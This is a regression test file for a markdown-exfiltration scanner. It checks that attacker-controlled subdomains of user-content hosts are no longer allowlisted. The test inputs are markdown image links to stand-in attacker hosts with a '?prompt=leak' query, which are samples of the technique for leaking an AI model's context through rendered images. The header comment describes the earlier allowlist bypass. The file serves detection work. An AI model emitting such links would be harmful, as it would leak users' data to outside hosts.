/**
 * Bug #3 regression: safeHosts 2-tier allowlist closes the subdomain bypass.
 *
 * Pre-fix:
 *   safeHosts was ONE list, suffix-matched via `host === safe || host.endsWith('.' + safe)`.
 *   `googleusercontent.com` / `storage.googleapis.com` / `notion.so` were in
 *   that list, so attacker.googleusercontent.com / <bucket>.storage.googleapis.com /
 *   attacker.notion.so all short-circuited and never fired — a critical FN
 *   because anyone can host a payload on those user-content subdomains.
 *
 * Post-fix:
 *   imageOnlyHosts: dedicated CDN/image hosts, suffix-match safe
 *     (e.g. cdn.jsdelivr.net, raw.githubusercontent.com).
 *   userContentHosts: user-content sites, EXACT-host only
 *     (e.g. github.com, notion.so).
 *   googleusercontent.com / storage.googleapis.com / firebasestorage.googleapis.com
 *     are in NEITHER list — strong-key URLs on them now fire as danger.
 */

import { describe, it, expect } from "vitest";
import { detectMarkdownExfil } from "@shield-scanner/core";

describe("Bug #3 regression: safeHost subdomain-bypass closed", () => {
  it("attacker.googleusercontent.com + strong key fires as danger", () => {
    const md =
      "![evil](https://attacker.googleusercontent.com/payload.png?prompt=leak)";
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].technique).toBe(
      "Markdown image exfiltration (strong key)"
    );
  });

  it("<bucket>.storage.googleapis.com + strong key fires as danger", () => {
    const md =
      "![evil](https://attacker-bucket.storage.googleapis.com/p.png?prompt=leak)";
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
  });

  it("attacker.notion.so + strong key fires as danger (subdomain of user-content host)", () => {
    const md = "![n](https://attacker.notion.so/p.png?prompt=leak)";
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
  });

  it("attacker.github.com + strong key fires as danger (subdomain of user-content host)", () => {
    const md = "![g](https://attacker.github.com/p.png?prompt=leak)";
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
  });

  it("EXACT notion.so (the bare 2LD) is still safe — userContentHost exact match", () => {
    // A weak-key-only URL on the exact 2LD must still short-circuit because
    // notion.so itself is in userContentHosts.
    const md = "![n](https://notion.so/page/image.png?prompt=leak)";
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("raw.githubusercontent.com + strong key is still safe (imageOnlyHost suffix-match)", () => {
    // Tier-1 CDN hosts keep the suffix-match.
    const md =
      "![ok](https://raw.githubusercontent.com/foo/bar/main/x.png?prompt=leak)";
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("foo.cdn.jsdelivr.net + strong key is still safe (imageOnlyHost suffix-match)", () => {
    const md =
      "![ok](https://foo.cdn.jsdelivr.net/npm/pkg/dist/x.png?prompt=leak)";
    expect(detectMarkdownExfil(md)).toEqual([]);
  });
});
